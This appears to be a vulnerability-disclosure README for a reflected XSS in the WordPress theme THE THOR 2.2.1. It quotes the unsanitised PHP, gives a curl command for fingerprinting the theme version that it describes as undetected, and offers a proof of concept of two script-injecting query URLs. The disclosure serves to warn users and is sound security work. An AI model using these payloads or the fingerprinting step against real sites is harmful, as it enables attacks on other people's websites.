# the-thor_vulnerability
ðŸ‘» Reflected XSS in WordPress Theme THE THOR  
CVE-XXXX-XXXX (0day)  

**âš Please update WordPress Theme THE THOR to the latest version!!!!âš **  

The vulnerability was disclosed after 365 days of reporting to [IPA](https://www.ipa.go.jp/) and developers.This PoC was created to alert users and investigate vulnerabilities in their own sites, and is not to be used for attacks.Requests to other people's sites may be prohibited by law.  

## Vulnerability
The following versions are vulnerable.  
- WordPress Theme THE THOR <= 2.2.1  

The vulnerability is due to inadequate sanitization of the front (`/wp-content/themes/the-thor/inc/front/archive_controller.php`).  
```php
if (isset($_GET["s"])) {
    echo '<input type="hidden" name="s" value="'.$_GET["s"].'" />';
}
if (isset($_GET["cat"])) {
    echo '<input type="hidden" name="cat" value="'.$_GET["cat"].'" />';
}
```
We can check the version of the theme from `style.css`.This is an undetected method of investigation as an attack.  
```bash
$ curl -s http://$target/wp-content/themes/the-thor/style.css | grep Version
Version: 2.2.1
```

## PoC
```
# Exploit Title: WordPress Theme THE THOR 2.2.1 - Cross Site Scripting (XSS)
# Date: 06/04/2022
# Exploit Author: Satoki
# Vendor Homepage: https://fit-theme.com/the-thor/
# Version: 2.2.1
# Tested on: Linux


# Description:
Reflected XSS via search queries and category queries.
Can check the version of the theme at "/wp-content/themes/the-thor/style.css".

# Proof of Concept:
http://$target/?cat="><svg/onload=alert`test`>
http://$target/?s="><img src=1 onerror=alert`test`>
```
